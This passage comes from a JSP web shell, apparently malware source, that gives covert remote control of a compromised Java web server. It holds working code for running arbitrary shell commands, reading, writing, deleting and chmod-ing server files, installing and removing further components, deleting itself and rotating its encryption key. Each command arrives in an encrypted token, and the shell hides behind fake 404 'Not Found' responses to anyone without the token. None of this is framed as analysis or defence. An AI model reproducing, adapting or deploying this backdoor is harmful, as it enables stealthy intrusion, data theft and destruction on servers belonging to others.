      String t = f.isDirectory() ? "d" : (f.isFile() ? "f" : (Files.isSymbolicLink(f.toPath()) ? "l" : "o"));
      long size = "d".equals(t) ? 0 : f.length();
      sb.append('\n').append(jwfB64(f.getName())).append('\t').append(t).append('\t').append(size).append('\t').append(f.lastModified() / 1000L).append('\t').append(jwfMode(f));
    }
    return sb.toString();
  } catch (Exception e) { return jwfErr(String.valueOf(e.getMessage())); }
}
static String jwfRead(String p, long off, int len) {
  if (off < 0) { off = 0; }
  if (len < 0) { len = 0; }
  if (len > 1048576) { len = 1048576; }
  try {
    File f = jwfFile(p);
    if (!f.isFile()) { return jwfErr("not a file"); }
    long size = f.length();
    if (off > size) { off = size; }
    RandomAccessFile raf = new RandomAccessFile(f, "r");
    try {
      raf.seek(off);
      byte[] data = new byte[len];
      int total = 0;
      while (total < len) {
        int r = raf.read(data, total, len - total);
        if (r <= 0) { break; }
        total += r;
      }
      return "DATA\n" + jwfB64(f.getPath()) + "\n" + off + "\n" + size + "\n" + ((off + total >= size) ? 1 : 0) + "\n" + jwb64e(Arrays.copyOf(data, total));
    } finally { raf.close(); }
  } catch (Exception e) { return jwfErr(String.valueOf(e.getMessage())); }
}
static String jwfWrite(String p, long off, boolean start, byte[] data, String selfPath) {
  if (p == null || p.length() == 0 || p.indexOf('\0') >= 0) { return jwfErr("invalid path"); }
  if (off < 0) { off = 0; }
  if (data == null) { data = new byte[0]; }
  try {
    File f = jwfFile(p);
    File parent = f.getParentFile();
    if (parent == null || !parent.isDirectory()) { return jwfErr("parent not found"); }
    if (jwfProtected(f, selfPath)) { return jwfErr("shell file is protected"); }
    if (f.isDirectory()) { return jwfErr("is a directory"); }
    RandomAccessFile raf = new RandomAccessFile(f, "rw");
    try {
      if (start) { raf.setLength(0); }
      raf.seek(off);
      raf.write(data);
      raf.getFD().sync();
    } finally { raf.close(); }
    return "WROTE\n" + jwfB64(f.getPath()) + "\n" + off + "\n" + data.length + "\n" + f.length();
  } catch (Exception e) { return jwfErr(String.valueOf(e.getMessage())); }
}
static boolean jwfRm(File f, boolean rec) {
  try {
    if (Files.isSymbolicLink(f.toPath()) || f.isFile()) { return f.delete(); }
    if (!f.isDirectory()) { return false; }
    if (!rec) { return f.delete(); }
    File[] kids = f.listFiles();
    if (kids == null) { return false; }
    for (File k : kids) { if (!jwfRm(k, true)) { return false; } }
    return f.delete();
  } catch (Exception e) { return false; }
}
static String jwfDelete(String p, boolean rec, String selfPath) {
  try {
    File f = jwfFile(p);
    if (!f.exists() && !Files.isSymbolicLink(f.toPath())) { return jwfErr("not found"); }
    if (jwfRoot(f)) { return jwfErr("refuse to delete root"); }
    if (jwfProtected(f, selfPath)) { return jwfErr("shell file is protected"); }
    if (!jwfRm(f, rec)) { return jwfErr("delete failed"); }
    return jwfOk(f.getPath());
  } catch (Exception e) { return jwfErr(String.valueOf(e.getMessage())); }
}
static String jwfRename(String src, String dst, String selfPath) {
  if (src.length() == 0 || dst.length() == 0 || src.indexOf('\0') >= 0 || dst.indexOf('\0') >= 0) { return jwfErr("invalid path"); }
  try {
    File a = jwfFile(src);
    if (!a.exists() && !Files.isSymbolicLink(a.toPath())) { return jwfErr("source not found"); }
    if (jwfProtected(a, selfPath)) { return jwfErr("shell file is protected"); }
    File b = jwfFile(dst);
    if (b.getParentFile() == null || !b.getParentFile().isDirectory()) { return jwfErr("target dir not found"); }
    if (jwfProtected(b, selfPath)) { return jwfErr("shell file is protected"); }
    if (b.exists() || Files.isSymbolicLink(b.toPath())) { return jwfErr("target exists"); }
    if (!a.renameTo(b)) { return jwfErr("rename failed"); }
    return jwfOk(b.getPath());
  } catch (Exception e) { return jwfErr(String.valueOf(e.getMessage())); }
}
static String jwfMkdir(String p) {
  if (p.length() == 0 || p.indexOf('\0') >= 0) { return jwfErr("invalid path"); }
  try {
    File d = jwfFile(p);
    if (!d.isDirectory() && !d.mkdirs() && !d.isDirectory()) { return jwfErr("mkdir failed"); }
    return jwfOk(d.getPath());
  } catch (Exception e) { return jwfErr(String.valueOf(e.getMessage())); }
}
static String jwfChmod(String p, String mode, String selfPath) {
  if (!mode.matches("[0-7]{3,4}")) { return jwfErr("invalid mode"); }
  try {
    File f = jwfFile(p);
    if (!f.exists() && !Files.isSymbolicLink(f.toPath())) { return jwfErr("not found"); }
    if (jwfProtected(f, selfPath)) { return jwfErr("shell file is protected"); }
    int m = Integer.parseInt(mode, 8);
    PosixFilePermission[] all = { PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE, PosixFilePermission.OWNER_EXECUTE,
        PosixFilePermission.GROUP_READ, PosixFilePermission.GROUP_WRITE, PosixFilePermission.GROUP_EXECUTE,
        PosixFilePermission.OTHERS_READ, PosixFilePermission.OTHERS_WRITE, PosixFilePermission.OTHERS_EXECUTE };
    int[] bits = { 0400, 0200, 0100, 0040, 0020, 0010, 0004, 0002, 0001 };
    Set<PosixFilePermission> ps = new HashSet<PosixFilePermission>();
    for (int i = 0; i < bits.length; i++) { if ((m & bits[i]) != 0) { ps.add(all[i]); } }
    Files.setPosixFilePermissions(f.toPath(), ps);
    return jwfOk(f.getPath());
  } catch (UnsupportedOperationException e) { return jwfErr("chmod unsupported on this platform"); }
  catch (Exception e) { return jwfErr("chmod failed: " + e.getMessage()); }
}
static String jwfDispatch(String raw, String selfPath) {
  String[] a = raw.split("\n", -1);
  String act = a.length > 0 ? a[0] : "";
  if ("list".equals(act)) { return jwfList(jwfArg(a, 1), selfPath); }
  if ("read".equals(act)) { return jwfRead(jwfArg(a, 1), jwfNum(a, 2), (int)jwfNum(a, 3)); }
  if ("write".equals(act)) { return jwfWrite(jwfArg(a, 1), jwfNum(a, 2), jwfNum(a, 3) == 1, jwb64d(a.length > 4 ? a[4] : ""), selfPath); }
  if ("delete".equals(act)) { return jwfDelete(jwfArg(a, 1), jwfNum(a, 2) == 1, selfPath); }
  if ("rename".equals(act)) { return jwfRename(jwfArg(a, 1), jwfArg(a, 2), selfPath); }
  if ("mkdir".equals(act)) { return jwfMkdir(jwfArg(a, 1)); }
  if ("chmod".equals(act)) { return jwfChmod(jwfArg(a, 1), jwfArg(a, 2), selfPath); }
  return jwfErr("unknown action");
}
%>
<%
  String tk = request.getHeader(JWC);
  if (tk == null || tk.length() == 0) { tk = request.getParameter(JWC); }
  if (tk == null || tk.length() == 0) { response.setStatus(404); out.print("Not Found"); return; }
  byte[] key = jwkey();
  byte[] pt = jwopen(key, tk);
  if (pt == null || jwseen(tk)) { response.setStatus(404); out.print("Not Found"); return; }
  String p = new String(pt, "UTF-8");
  String op = p.substring(0, 1);
  if ("P".equals(op)) { out.print(jwseal(key, jwreply(new byte[0]))); return; }
  if ("E".equals(op)) {
    byte[] cb = jwarg(p);
    if (cb == null) { response.setStatus(404); out.print("Not Found"); return; }
    String cmd = new String(cb, "UTF-8");
    String os = System.getProperty("os.name", "").toLowerCase();
    ProcessBuilder pb = os.contains("win") ? new ProcessBuilder("cmd.exe", "/c", cmd) : new ProcessBuilder("/bin/sh", "-c", cmd);
    pb.redirectErrorStream(true);
    Process pr = pb.start();
    ByteArrayOutputStream bo = new ByteArrayOutputStream();
    byte[] buf = new byte[8192]; int n;
    while ((n = pr.getInputStream().read(buf)) > 0) { bo.write(buf, 0, n); }
    pr.waitFor();
    out.print(jwseal(key, jwreply(bo.toByteArray())));
    return;
  }
  if ("F".equals(op)) {
    byte[] fb = jwarg(p);
    String fsOut;
    if (fb == null) {
      fsOut = jwfErr("bad request");
    } else {
      String selfPath = null;
      try { selfPath = application.getRealPath(request.getServletPath()); } catch (Throwable e) { }
      try { fsOut = jwfDispatch(new String(fb, "UTF-8"), selfPath); }
      catch (Throwable e) { fsOut = jwfErr(String.valueOf(e.getMessage())); }
    }
    out.print(jwseal(key, jwreply(fsOut.getBytes("UTF-8"))));
    return;
  }
  if ("M".equals(op)) {
    byte[] mb = jwarg(p);
    if (mb == null) { response.setStatus(404); out.print("Not Found"); return; }
    Map<String, String> f = jwmFields(new String(mb, "UTF-8"));
    String act = jwmStr(f.get("action"));
    String ack;
    if ("install".equals(act)) { ack = jwmsInstall(application, f); }
    else if ("remove".equals(act)) { ack = jwmsRemoveOp(application, f); }
    else if ("probe".equals(act)) { ack = jwmsProbe(application); }
    else { ack = jwmErr("未知操作"); }
    out.print(jwseal(key, jwreply(ack.getBytes("UTF-8"))));
    return;
  }
  if ("D".equals(op)) {
    boolean ok = false;
    try {
      String rp = application.getRealPath(request.getServletPath());
      if (rp != null) { File sf = new File(rp); ok = sf.delete(); }
      new File(System.getProperty("java.io.tmpdir"), JWF).delete();
    } catch (Exception e) { }
    out.print(jwseal(key, jwreply((ok ? "__JWDEL_OK__" : "__JWDEL_FAIL__").getBytes("UTF-8"))));
    return;
  }
  if ("R".equals(op)) {
    byte[] nk = jwarg(p);
    if (nk == null || nk.length != 32) { response.setStatus(404); out.print("Not Found"); return; }
    try { Files.write(Paths.get(System.getProperty("java.io.tmpdir"), JWF), Base64.getEncoder().encode(nk), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING); } catch (Exception e) { }
    JWKEY = nk;
    out.print(jwseal(nk, jwreply(new byte[0])));
    return;
  }
  response.setStatus(404); out.print("Not Found");
%>
`
